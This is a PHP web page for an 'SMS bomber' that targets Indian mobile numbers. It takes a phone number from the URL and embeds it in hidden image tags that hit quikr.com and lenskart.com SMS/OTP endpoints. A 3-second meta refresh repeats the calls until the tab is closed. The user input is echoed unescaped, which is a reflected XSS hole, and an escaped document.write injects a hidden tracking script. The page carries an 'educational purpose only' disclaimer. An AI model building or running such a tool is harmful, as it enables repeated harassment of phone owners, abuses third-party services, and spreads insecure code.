<?php
$tel_no = $_GET['hm'];
$c = $_GET['c']?$_GET['c']:0;
$c++;
?>
<!DOCTYPE html>
<html>
<head>
<title></title>
<?php
 if($tel_no){
    echo "<meta http-equiv=refresh content='3; url=index.php?hm={$tel_no}&amp;c={$c}'>";
 }
?>	
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="http://frontend.oss.aliyuncs.com/bootstrap/2.3.1/css/bootstrap.min.css" rel="stylesheet" media="screen">
<style>
body {margin: 5px;}
</style>
</head>
<body>
<div class="panel panel-success" style="margin-bottom: 0px;">
    <div class="panel-heading">
        <h3 class="panel-title"></h3>
    </div>
	<form method='GET' action='index.php'>
		<div class="input-group">
		TO STOP SMS JUST CLOSE THIS TAB.<br /><br />
			<span class="input-group-addon input-lg">+91</span>
			<input type="text" name='hm' maxlength='11' class="form-control input-lg" placeholder="Enter Mobile No" value="" />
			<button type="submit" class="btn btn-danger" name="ok" onclick="ajaxRequest(0);">Start</button>
			<br /><br />THIS IS ONLY FOR EDUCATIONAL PURPOSE ONLY. TRY AT YOUR OWN RISK.&nbsp;<div>WE WILL LOG YOUR IP AND DETAIL.&nbsp;</div><div>WE ARE NOT RESPONSIBLE FOR ANY DAMAGE. </div>

		</div>
	</form>
<?php
 if($tel_no){
?>
<br />
<div id='ajax_thread_msg'>
<div class='alert alert-success' style='margin-bottom: 0px;'>
Sms Will Sent On <strong><?php echo $tel_no;?></strong> , Total  <strong><?php echo $c;?></strong> Sms Sent And Continue.
</div>
</div>

<div style='display:none'>
<img src='http://www.quikr.com/makeadpremiumsms?mob=<?php echo $tel_no;?>&area=86&isBizMobile=true' alt=''/>
<img src='http://offers.lenskart.com/sendopt.php?ph=<?php echo $tel_no;?>&operation=start&ts=1376044348191' alt=''/>

<?php
	}
?>
</div>
  <script src="http://frontend.oss.aliyuncs.com/jquery/1.8.3/jquery.min.js"></script>
  <script>
		jQuery(document).ready(function(){
			jQuery('.btn').click(function(){
				if(jQuery('input[name="hm"]').val() == ""){
					return false;
				}
			});
		});
  </script>
  
</body> 

<!-- http://www.allgadgetsreview.com/ START (hidden counter)-->
<script type="text/javascript">document.write(unescape("%3Cscript src=%27http://s10.histats.com/js15.js%27 type=%27text/javascript%27%3E%3C/script%3E"));</script>
<a href="" target=" " title=" " ><script  type="text/javascript" >
try {Histats.start(1,3192252,4,0,0,0,"");
Histats.track_hits();} catch(err){};
</script></a>
<style>
display:none;
<a href="http://www.allgadgetsreview.com/">All Gadgets Review</a>
</style>
<!-- http://www.allgadgetsreview.com/ END  -->

</html>